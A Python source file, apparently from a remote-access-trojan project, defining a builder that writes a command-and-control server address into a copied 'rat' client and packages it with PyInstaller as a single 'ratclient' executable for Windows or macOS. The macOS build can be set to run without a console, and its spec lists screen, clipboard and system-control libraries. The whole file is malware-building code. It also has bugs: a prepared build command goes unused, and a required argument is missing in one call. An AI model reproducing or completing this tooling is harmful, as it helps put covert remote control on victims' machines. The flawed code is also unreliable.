# server/application/agent/agent_builder.py

import os
import shutil
import subprocess
import tempfile


class AgentBuilder:
    """Agent 生成器"""

    def __init__(self):
        self.client_source_dir = os.path.abspath('.')
        self.output_dir = os.path.abspath(os.path.join('runtime', 'agent_output'))
        self._ensure_dirs()

    def _ensure_dirs(self):
        os.makedirs(self.output_dir, exist_ok=True)

    def build_agent(self, server_host: str, server_port: int,
                    web_port: int = None, target_os: str = 'mac',
                    builder: str = 'pyinstaller', console=False) -> dict:
        """
        构建 Agent
        """

        work_dir = tempfile.mkdtemp(prefix='agent_build_')

        try:
            # 复制客户端源码
            client_copy = os.path.join(work_dir, 'rat')
            shutil.copytree(self.client_source_dir, client_copy)

            print(os.path.abspath(client_copy))

            print(os.path.isdir(client_copy))

            # 生成配置文件，嵌入到代码中
            self._inject_config(client_copy, server_host, server_port, web_port)

            print(target_os)
            # 根据目标系统构建
            if target_os == 'win':
                result = self._build_windows(client_copy, work_dir)
            elif target_os == 'mac':
                result = self._build_macos(client_copy, work_dir, console)
            else:
                raise ValueError(f'Unsupported target OS: {target_os}')

            output_path = os.path.join(self.output_dir, result['file_name'])
            shutil.copy2(result['file_path'], output_path)

            return {
                'file_path': output_path,
                'file_name': result['file_name'],
                'size': os.path.getsize(output_path),
                'work_dir': work_dir
            }

        except Exception as e:
            shutil.rmtree(work_dir, ignore_errors=True)
            raise

    # server/application/agent/agent_builder.py

    def _inject_config(self, client_dir: str, server_host: str, server_port: int, web_port: int):
        """直接用模板替换 config.py"""
        config_path = os.path.join(client_dir, 'client', 'config', 'config.py')

        # 模板内容
        template = f'''
import os
SERVER_HOST = "{server_host}"
SERVER_PORT = {server_port}
SERVER_ADDR = (SERVER_HOST, SERVER_PORT)

SERVER_WEB_SCHEME = "http"
SERVER_WEB_HOST = "{server_host}"
SERVER_WEB_PORT = {web_port}
UPLOAD_BASE_URL = f"{{SERVER_WEB_SCHEME}}://{{SERVER_WEB_HOST}}:{{SERVER_WEB_PORT}}"

RECONNECT_INTERVAL_SECONDS = 10
JOB_PATH =os.path.join(os.getcwd(), 'jobs', 'builtins')
    '''

        with open(config_path, 'w', encoding='utf-8') as f:
            f.write(template)

    # server/application/agent/agent_builder.py

    def _build_macos(self, client_dir: str, work_dir: str, console) -> dict:
        """macOS 构建"""

        cmd = ['pyinstaller', '-F', 'ratclient.py']
        if not console:
            cmd.append('-w')

        # 添加隐藏导入
        cmd.extend([
            '--hidden-import', 'client.commands.platform.mac',
            '--hidden-import', 'client.commands.platform.win',
            '--hidden-import', 'client.commands.platform.linux',
        ])

        # 切换到 client 目录
        result = subprocess.run(
            ['pyinstaller', '-F', 'ratclient.py'],
            cwd=client_dir,
            capture_output=True,
            text=True
        )

        if result.returncode != 0:
            raise RuntimeError(f'PyInstaller failed: {result.stderr}')

        exe_path = os.path.join(client_dir, 'dist', 'ratclient')
        if not os.path.exists(exe_path):
            raise RuntimeError(f'Build output not found: {exe_path}')

        os.chmod(exe_path, 0o755)

        return {
            'file_path': exe_path,
            'file_name': 'ratclient_mac'
        }

    def _build_windows(self, client_dir: str, work_dir: str, console) -> dict:
        """Windows 构建"""
        result = subprocess.run(
            ['pyinstaller', '-F', 'ratclient.py'],
            cwd=client_dir,
            capture_output=True,
            text=True,
            shell=True
        )

        if result.returncode != 0:
            raise RuntimeError(f'PyInstaller failed: {result.stderr}')

        exe_path = os.path.join(client_dir, 'dist', 'ratclient.exe')
        if not os.path.exists(exe_path):
            raise RuntimeError(f'Build output not found: {exe_path}')

        return {
            'file_path': exe_path,
            'file_name': 'ratclient.exe'
        }

    def _generate_pyinstaller_spec(self, client_dir: str, output_name: str) -> str:
        """生成 PyInstaller spec 文件"""
        main_script = os.path.join(client_dir, 'ratclient.py')

        spec = f"""
# -*- mode: python ; coding: utf-8 -*-

a = Analysis(
    ['{main_script}'],
    pathex=['{client_dir}'],
    binaries=[],
    datas=[],
    hiddenimports=[
        'requests',
        'psutil',
        'PIL',
        'schedule',
        'pyperclip',
        'pyautogui',
        'sqlite3',
    ],
    hookspath=[],
    hooksconfig={{}},
    runtime_hooks=[],
    excludes=[],
    noarchive=False,
)

pyz = PYZ(a.pure)

exe = EXE(
    pyz,
    a.scripts,
    a.binaries,
    a.datas,
    [],
    name='{output_name}',
    debug=False,
    bootloader_ignore_signals=False,
    strip=False,
    upx=True,
    upx_exclude=[],
    runtime_tmpdir=None,
    console=True,
    disable_windowed_traceback=False,
    argv_emulation=False,
    target_arch=None,
    codesign_identity=None,
    entitlements_file=None,
)
"""
        return spec

    def cleanup(self, work_dir: str):
        """清理临时目录"""
        if work_dir and os.path.exists(work_dir):
            shutil.rmtree(work_dir, ignore_errors=True)
